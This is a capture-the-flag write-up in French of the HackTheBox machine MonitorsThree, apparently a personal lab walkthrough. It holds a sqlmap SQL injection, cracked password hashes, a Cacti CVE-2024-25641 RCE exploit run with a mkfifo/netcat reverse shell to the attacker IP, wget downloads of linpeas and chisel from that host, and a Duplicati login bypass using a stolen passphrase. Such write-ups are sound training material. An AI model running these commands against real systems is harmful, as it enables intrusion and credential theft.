# Info de la box

```md
My IP: 10.10.16.4
IP Target: 10.10.11.30
OS: Linux (medium)
```

## Énumération

```bash
➜  ~ sudo nmap -sSVC -T5 -p- 10.10.11.30  
PORT     STATE    SERVICE VERSION  
22/tcp   open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux;  
protocol 2.0)  
| ssh-hostkey:    
|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)  
|_  256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)  
80/tcp   open     http    nginx 1.18.0 (Ubuntu)  
|_http-title: Did not follow redirect to http://monitorsthree.htb/  
|_http-server-header: nginx/1.18.0 (Ubuntu)  
8084/tcp filtered websnp  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On voit que sur le port 80, il y a une redirection sur http://monitorsthree.htb/ on trouve donc un DNS à ajouter dans /etc/hosts.

Remarque ici il y un port assez particulier et étrange le 8084, avec websnp comme service qui tourne dessus.

```bash
➜  ~ sudo nano /etc/hosts
10.10.11.30     monitorsthree.htb
```

Je vais lancer un fuzz de directory, et en attendant je fais de l'analyse passive sur la page web.

```bash
➜  ~ sudo ffuf -w HDD/Documents/SecLists/Discovery/Web-Content/combined_directories.txt -u http://monitorsthree.htb/FUZZ -c -recursion

R.A.S
```

Je lance par la suite un fuzz des Vhosts:

```bash
➜  ~ sudo ffuf -w HDD/Documents/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://monitorsthree.htb/ -H "Host:FUZZ.mo  
nitorsthree.htb" -c -fs 13560

cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1]  
```

Bingo on trouve un Vhost.

Je l'ajoute au /etc/hosts

```bash
➜  ~ sudo nano /etc/hosts
10.10.11.30     monitorsthree.htb cacti.monitorsthree.htb
```

### Découverte de l'infra web

#### monitorsthree.htb

On peut noter des creds:

- Nicola Johnson (IT Manager, TechCorp)
- Glenn Jones (CEO, BizSolutions)
- sales@monitorsthree.htb
- Harlow, London, United Kingdom

Je cherche aussi à découvrir les technos du site:

```bash
➜  ~ whatweb -a3 http://monitorsthree.htb/                           
http://monitorsthree.htb/ [200 OK] Bootstrap[4.4.1], Country[RESERVED][ZZ], Email[sales@monitorsthree.htb], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.30], JQuery, Script, Title[MonitorsThree - Networking Solutions],
X-UA-Compatible[IE=edge], nginx[1.18.0]
```

Wappalyzer va nous donner une version précise de JQuery (3.1.1)

Rien d'intéressant sinon.
#### /login.php

Il y a donc une page d'authentification avec 2 champs (username/password).

Je fais un coup de burpsuite pour check vite fait 

Ici c'est intéressant on voit que la requête dérrière est bien un POST

et en plus il y a un cookie et les 2 paramètres sont bien envoyés au serveur.

```http
POST /login.php HTTP/1.1
Cookie: PHPSESSID=iefj5ja74uftlqnlfr1g5t90hv
username=test&password=test
```

Ici ça peut être intéressant, même si je pense pas que la vuln soit ici. 

Je pense plus qu'il faut fouiller dans le vhost que j'ai trouvé, mais au cas ou j'ai lancé un sqlmap en fond, mais R.A.S.

Il y a aussi /forgot_password.php ou j'ai test des SQLi, puisqu'en essayant des payloads de xss, j'ai fait sauter une erreur mariadb :D
## Exploitation

Je lance donc un scan sqlmap en fond sur le paramètre. 

(Evidemment je mets mysql pour préciser, comme MariaDB est un fork de mysql)

```bash
➜  ~ sqlmap -u http://monitorsthree.htb/forgot_password.php --data "username=*" --level=5 --dbms mysql --tables --batch --threads=10

sqlmap identified the following injection point(s) with a total of 1299 HTTP(s) requests  
:  
---  
Parameter: #1* ((custom) POST)  
   Type: stacked queries  
   Title: MySQL >= 5.0.12 stacked queries (comment)  
   Payload: username=';SELECT SLEEP(5)#  
  
   Type: time-based blind  
   Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)  
   Payload: username=' AND (SELECT 9931 FROM (SELECT(SLEEP(5)))cHAe)-- omry  
---  
[19:06:10] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu  
web application technology: PHP, Nginx 1.18.0  
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)

[00:19:15] [INFO] retrieved: users  
[00:25:51] [INFO] fetching number of tables for database 'information_schema'  
[00:25:51] [INFO] resumed: 79  
[00:25:51] [INFO] resumed: ALL_PLUGINS  
[00:25:51] [INFO] resumed: APPLICABLE_ROLES  
[00:25:51] [INFO] resumed: CHARACTER_SETS  
[00:25:51] [INFO] resumed: CHECK_CONSTRAINTS  
[00:25:51] [INFO] resumed: COLLATIONS  
[00:25:51] [INFO] resumed: COLLATION_CHARACTER_SET_APPLICABILITY  
[00:25:51] [INFO] resumed: COLUMNS  
[00:25:51] [INFO] resumed: COLUMN_PRIVILEGES  
[00:25:51] [INFO] resumed: ENABLED_ROLES  
[00:25:51] [INFO] resumed: ENGINES  
[00:25:51] [INFO] resumed: EVENTS  
[00:25:51] [INFO] resumed: FILES  
[00:25:51] [INFO] resumed: GLOBAL_STATUS  
[00:25:51] [INFO] resumed: GLOBAL_VARIABLES  
[00:25:51] [INFO] resumed: KEYWORDS  
[00:25:51] [INFO] resumed: KEY_CACHES
```

Pouf il a trouvé, on était ici sur une SQLi Time Based :D

```bash
➜  ~ sqlmap -u http://monitorsthree.htb/forgot_password.php --data "username=*" --level=5 --dbms mysql --tables --batch --threads=10

[23:43:50] [INFO] resumed: monitorsthree_db

➜  ~ sqlmap -u http://monitorsthree.htb/forgot_password.php --data "username=*" --level=5 --dbms mysql --tables -D monitorsthree_db --batch --threads=10

Database: monitorsthree_db  
[6 tables]  
+---------------+  
| changelog     |  
| customers     |  
| invoice_tasks |  
| invoices      |  
| tasks         |  
| users         |  
+---------------+

➜  ~ sqlmap -u http://monitorsthree.htb/forgot_password.php --data "username=*" --level=5 --dbms mysql --tables -D monitorsthree_db -T users --batch --threads=10 --dump

|id | email                  | pwd                              | username  |
|---|------------------------|----------------------------------|-----------|
| 2 | admin@monitors.htb     | 31a181c8372e3afc59dab863430610e8 | admin     |
| 5 | mwatson@monitors.htb   | c585d01f2eb3e6e1073e92023088a3dd | mwatson   |
| 6 | janderson@monitors.htb | 1e68b6eb86b45f6d92f8f292428f77ac | janderson |
| 7 | dthompson@monitors.htb | 633b683cc128fe244b00f176c8a950f5 | dthompson |
```

Par manque de place je vous affiches, que le strict minimum. 

J'ai donc décidé d'enlever le champ dob, name, salary, position, start_date.

Bon première remarque, ici on a pas besoin de chercher le format du hash c'est assez obvious que c'est du MD5 :D

Je lance donc un petit hashcat pour péter le hash du mdp admin.

```bash
➜  ~ hashcat -m 0 -a 0 '31a181c8372e3afc59dab863430610e8' ./HDD/Documents/rockyou.txt

31a181c8372e3afc59dab863430610e8:greencacti2001
```

Bingo !

Les autres ne sont pas exploitables avec le dictionnaire rockyou.

je tente de me login et hop on est connecté au dashboard en admin :D

Mais bon ici on peut passer au vhost que j'avais trouvé car j'y avais trouvé des CVE, mais il fallait être authentifié pour exploit.
#### cacti.monitorsthree.htb

Je chope dans le code source une version de l'outil qu'utilise le vhost
- cactiVersion 1.2.26

Je vais donc chercher logiquement si il existerait pas une CVE sur la version.
- Je trouve une première CVE -> (CVE-2024-31445)
	- C'est une SQLi, mais il faut être authentifié.
- Je trouve une autre CVE -> (CVE-2024-25641) 
	- Celle-ci permet une RCE PHP, mais encore une fois il faut être authentifié.

Désormais on a les creds de l'admin donc ici la CVE qui permet une RCE, est ce qui nous intéresse dans notre cas.

Je trouve un bon exploit: https://github.com/StopThatTalace/CVE-2024-25641-CACTI-RCE-1.2.26?tab=readme-ov-file

Je rentre l'exploit, j'arrivais pas à faire marcher l'exploit car j'avais pas mit /cacti/ dans l'url :D

Donc je me mets en écoute avec pwncat-cs

```bash
➜  CVE-2024-25641-CACTI-RCE-1.2.26 git:(master) ✗ python3 CVE-2024-25641.py http://cacti.monitorsthree.htb/cacti/ --user admin --p  
ass greencacti2001 -x 'whoami'

www-data
```

Comme l'exploit marche je me mets en écoute pour faire un reverse shell.

```bash
pwncat-cs -lp 9001
```

```bash
➜  CVE-2024-25641-CACTI-RCE-1.2.26 git:(master) ✗ python3 CVE-2024-25641.py http://cacti.monitorsthree.htb/cacti/ --user admin --p  
ass greencacti2001 -x 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.4 9001 >/tmp/f'
```

et Hop j'ai une connexion sur mon reverse shell :D

```bash
(remote) www-data@monitorsthree:/var/www/html/cacti/resource$
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## Privesc

Pour le moment je décide de chercher dans les fichiers des mdp:

```bash
www-data@monitorsthree:/var/www/html/cacti$ grep -r "password" /var/www/html/ > /tmp/enumfile
www-data@monitorsthree:/var/www/html/cacti$ nano /tmp/enumfile

/var/www/html/cacti/include/config.php:$database_password = 'cactiuser';  
/var/www/html/cacti/include/vendor/phpmailer/README.md: $mail->Password = 'secret';
/var/www/html/cacti/.github/workflows/syntax.yml:        echo -e "[client]\nuser = root\npassword = cactiroot\nhost = 127.0.0.1\n>
```

```bash
www-data@monitorsthree:/var/www/html/cacti$ cat /var/www/html/cacti/include/config.php

$database_type     = 'mysql';  
$database_default  = 'cacti';  
$database_hostname = 'localhost';  
$database_username = 'cactiuser';  
$database_password = 'cactiuser';  
$database_port     = '3306';
```

Je me connecte à la SGBD au cas ou je pourrais trouver autre chose que j'ai pas déjà.

```bash
www-data@monitorsthree:/$ mysql -h localhost -P 3306 -u cactiuser -p  
Enter password:    
Welcome to the MariaDB monitor.  Commands end with ; or \g.  
Your MariaDB connection id is 149458  
Server version: 10.6.18-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

MariaDB [(none)]> SHOW DATABASES;  
+--------------------+  
| Database           |  
+--------------------+  
| cacti              |  
| information_schema |  
| mysql              |  
+--------------------+

MariaDB [(none)]> \u cacti
Database changed

admin: $2y$10$tjPSsSP6UovL3OTNeam4Oe24TSRuSRRApmqf5vPinSer3mDuyG90G
marcus: $2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK
guest: $2y$10$SO8woUvjSFMr1CDo8O3cz.S6uJoqLaTe6/mvIcUuXzKsATo77nLHu

```

et donc je décide de péter le mdp avec hashcat:

```bash
➜  ~ hashcat -m 3200 -a 0 '$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK' HDD/Documents/rockyou.txt

$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK:12345678910
```

Et pouf il pète le mdp de marcus :D

On s'y connecte:

```bash
www-data@monitorsthree:/tmp$ su marcus  
Password:
marcus@monitorsthree:/tmp$ id  
uid=1000(marcus) gid=1000(marcus) groups=1000(marcus)
```

Je lance un linpeas pour continuer la privesc:

```bash
marcus@monitorsthree:/tmp$ wget http://10.10.16.4:9009/linpeas.sh
marcus@monitorsthree:/tmp$ chmod +x linpeas.sh
marcus@monitorsthree:/tmp$ ./linpeas.sh > enumfile
marcus@monitorsthree:/tmp$ cat enumfile

Hostname: monitorsthree  
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)  
OS: Linux version 5.15.0-118-generic

127.0.1.1 monitorsthree # /etc/hosts

www-data@monitorsthree:/tmp$ netstat -pentula
tcp        0      0 0.0.0.0:8084            0.0.0.0:*               LISTEN      1180/mono

-rw-r--r-- 1 root root 11686 Jul 11  2023 /etc/mono/2.0/web.config  
-rw-r--r-- 1 root root 18848 Jul 11  2023 /etc/mono/4.0/web.config  
-rw-r--r-- 1 root root 18857 Jul 11  2023 /etc/mono/4.5/web.config  
-rw-r--r-- 1 root root 1327 Dec 28  2020 /usr/share/monodoc/web/web.config

═════════════════════╣ Files with Interesting Permissions╠══════════════════════ 
                     ╚═══════════════════════════════════╝  
╔══════════╣ SUID - Check easy privesc, exploits and write perms  
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid  
-rwsr-xr-x 1 root root 331K Jun 26 13:11 /usr/lib/openssh/ssh-keysign  
-rwsr-xr-- 1 root messagebus 35K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper  
-rwsr-xr-x 1 root root 71K Feb  6  2024 /usr/bin/gpasswd  
-rwsr-xr-x 1 root root 35K Apr  9 15:32 /usr/bin/umount  --->  BSD/Linux(08-1996)  
-rwsr-xr-x 1 root root 59K Feb  6  2024 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)  
-rwsr-xr-x 1 root root 35K Mar 23  2022 /usr/bin/fusermount3  
-rwsr-xr-x 1 root root 227K Apr  3  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable  
-rwsr-xr-x 1 root root 72K Feb  6  2024 /usr/bin/chfn  --->  SuSE_9.3/10  
-rwsr-xr-x 1 root root 47K Apr  9 15:32 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8  
-rwsr-xr-x 1 root root 40K Feb  6  2024 /usr/bin/newgrp  --->  HP-UX_10.20  
-rwsr-xr-x 1 root root 55K Apr  9 15:32 /usr/bin/su  
-rwsr-xr-x 1 root root 44K Feb  6  2024 /usr/bin/chsh  
-rwsr-xr-x 1 root root 19K Feb 26  2022 /usr/libexec/polkit-agent-helper-1
```

J'ai décidé de fouiller les fichiers de configuration du framework mono

```bash
marcus@monitorsthree:/ cd /etc/mono
marcus@monitorsthree:/etc/mono$ egrep -r "password" ./*  
./2.0/web.config: <!--<user name="gonzalo" password="gonz"/>-->  
./4.0/web.config: <!--<user name="gonzalo" password="gonz"/>-->  
./4.5/web.config: <!--<user name="gonzalo" password="gonz"/>-->  
marcus@monitorsthree:/etc/mono$
```

Sinon dans /opt/ il y a un dossier ./backups/cacti

```bash
marcus@monitorsthree:/opt/backups/cacti$ ls -l  
total 20112  
-rw-r--r-- 1 root root   172507 May 26 16:29 duplicati-20240526T162923Z.dlist.zip  
-rw-r--r-- 1 root root   172088 Aug 20 11:30 duplicati-20240820T113028Z.dlist.zip  
-rw-r--r-- 1 root root   172086 Sep 17 21:49 duplicati-20240917T214938Z.dlist.zip  
-rw-r--r-- 1 root root   171326 Sep 18 11:00 duplicati-20240918T110000Z.dlist.zip  
-rw-r--r-- 1 root root   171461 Sep 19 11:00 duplicati-20240919T110000Z.dlist.zip  
-rw-r--r-- 1 root root    26394 Sep 19 11:00 duplicati-b01a0d01fdb3b4fc4bab0cfabb03336d1.dblock.zip  
-rw-r--r-- 1 root root    18548 Sep 18 11:00 duplicati-b72c6bd2a13ab4f2dbb7ff917696e8550.dblock.zip  
-rw-r--r-- 1 root root 19423816 May 26 16:29 duplicati-bb19cdec32e5341b7a9b5d706407e60eb.dblock.zip  
-rw-r--r-- 1 root root    25004 Aug 20 11:30 duplicati-bc2d8d70b8eb74c4ea21235385840e608.dblock.zip  
-rw-r--r-- 1 root root    10869 Sep 17 21:49 duplicati-bdab8487d17d945b9bf84ade5f001930f.dblock.zip  
-rw-r--r-- 1 root root     1266 Sep 17 21:49 duplicati-i680a4341c4224bd09f85284bbd6f00cb.dindex.zip  
-rw-r--r-- 1 root root     2493 Aug 20 11:30 duplicati-i7329b8d56a284479bade001406b5dec4.dindex.zip  
-rw-r--r-- 1 root root     1381 Sep 19 11:00 duplicati-icbf94cb6e08c4a5d8c276b76e3d56240.dindex.zip  
-rw-r--r-- 1 root root   185083 May 26 16:29 duplicati-ie7ca520ceb6b4ae081f78324e10b7b85.dindex.zip  
-rw-r--r-- 1 root root     1522 Sep 18 11:00 duplicati-if1512e0221f84b9bb41b8c4c951f627d.dindex.zip
```

On trouve ceci dans les backups qu'il y avait dans /opt

```sql
server-passphrase-trayicon-hashFJRGVBGSUj4vNdsDqCB5DTSJEjlupzCCppj/rcwdb5A=D@  
server-passphrase-trayiconb0225072-8450-41f1-85f7-7d3fab82319fH?  
server-passphrase-saltxTfykWV1dATpFZvPhClEJLJzYA5A4L74hX7FK8XmY0I=C>  
server-passphraseWb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=
```

Bon du coup on m'a apprit que je pouvais faire du port forwarding sans passer par ssh et sans avoir besoin d'un MDP :)

Donc ici je vais utiliser chisel qui va me permettre de me connecter au port 8200, car en faisant un 
`netstat -pentula` pour regarder les connections on voyait qu'il y avait un port 8200 établit.

Et en cherchant, j'ai découvert que c'était le port d'une interface web pour duplicati, l'outil qui gère les backups :D

Donc mise en place du port forwarding:

```bash
(My PC):
chisel server -p 9009 --reverse

(My PC):
# On télécharge le amd64.gz de chisel pour le transférer sur la cible
➜  Bureau gunzip chisel_1.10.0_linux_amd64.gz
# Mise en place du serveur python pour le transfert
➜  Bureau python3 -m http.server 8888

(PC Victime):
# Dans /tmp ou on a les droits on télécharge le file
marcus@monitorsthree:/tmp$ wget http://10.10.16.4:8888/chisel_1.10.0_linux_amd64
# On donne les perms pour exec
marcus@monitorsthree:/tmp$ chmod +x chisel_1.10.0_linux_amd64
# Puis on établi le port forwarding
marcus@monitorsthree:/tmp$ ./chisel_1.10.0_linux_amd64 client 10.10.16.4:9009 R:8200:localhost:8200
2024/09/19 22:10:26 client: Connecting to ws://10.10.16.4:9009  
2024/09/19 22:10:26 client: Connected (Latency 20.124322ms)

# 10.10.16.4 = My IP
# 9009 = le port d'écoute du serveur chisel
# 8200 = le port que je souhaite pouvoir avoir accès depuis mon pc
```

Il reste plus qu'à revenir sur notre pc, on fait une requête dans notre navigateur:

-> http://localhost:8200/

et Pouf une page de login duplicati qui nous demande un password ;)

J'inspecte le code sources et les scripts Js qui sont appelés et on voit un bout de code intéressant.

Et j'ai vu qu'on peut bypass les mdp duplicati lorsqu'on a à notre disposition la passphrase.
- https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee

```js
var saltedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Utf8.parse($('#login-password').val()) + CryptoJS.enc.Base64.parse(data.Salt)));

var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse(data.Nonce) + saltedpwd)).toString(CryptoJS.enc.Base64);
```

Je remplace donc le code js de l'authentification avec le nonce capturé avec burpsuite et la passphrase trouvé dans les files backups.

```js
var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse('XM3sQb439B2le4JmW887KPF0JOdE+nT2JSWDd+7CxFI=') + '59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a')).toString(CryptoJS.enc.Base64);
```

Je paste ça dans le console de la page, et j'obtiens:

```javascript
mefzkGP7ilMN3h6KT5HMpasT+pJmuGBPJzA0BOsoqCQ=
```

On suit la requête -> Do intercept > Response to this request

On nous demande le password et on envoie le password qu'on à forger. On encode avec CTRL + U et on send.

Et pouf on est connecté à duplicati :D (via root)

Ici on va créer une backup du plus classique, juste on va lui dire d'aller chercher le fichier mit à la destination:

`/source/root/root.txt`

Ensuite on va restaurer un backup, on fournit celui qu'on vient de créer et on lui dit de stocker ça dans:

`/source/home/marcus/root.txt` comme on peut y avoir accès.

On lance le backup, puis on retourne dans notre reverse shell. Il reste plus que à cat le /root.txt dans /home/marcus/ et voilà on vient de pwn Monitorsthree :D